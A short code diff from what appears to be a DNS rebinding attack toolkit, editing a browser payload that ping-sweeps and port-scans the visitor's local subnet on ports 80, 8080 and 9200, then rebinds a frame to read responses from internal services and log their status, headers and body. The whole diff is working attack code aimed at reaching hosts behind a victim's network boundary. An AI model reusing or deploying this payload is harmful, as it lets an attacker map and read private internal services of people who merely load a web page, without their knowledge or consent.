@@ -8,17 +8,22 @@ async function mainFrame () {
   const netmap = new NetMap()
   const localSubnet = await network.getLocalSubnet(24)
 
-  netmap.tcpScan(localSubnet, [80, 8080, 9200]).then(results => {
-    for (let h of results.hosts) {
-      for (let p of h.ports) {
-        if (p.open) session.createFastRebindFrame(h.host, p.port)
-      }
-    }
+  netmap.pingSweep(localSubnet).then(liveHosts => {
+    session.log(liveHosts)
+
+    netmap.tcpScan(liveHosts, [80, 8080, 9200]).then(results => {
+      session.log(results)
+      // for (let h of results.hosts) {
+      //   for (let p of h.ports) {
+      //     if (p.open) session.createRebindFrame(h.host, p.port)
+      //   }
+      // }
+    })
   })
 }
 
 function rebindFrame () {
-  session.triggerFastRebind().then(() => {
+  session.triggerRebind().then(() => {
     network.get(session.baseURL, {
       successCb: (code, headers, body) => {
         session.log({ code: code, headers: headers, body: body })
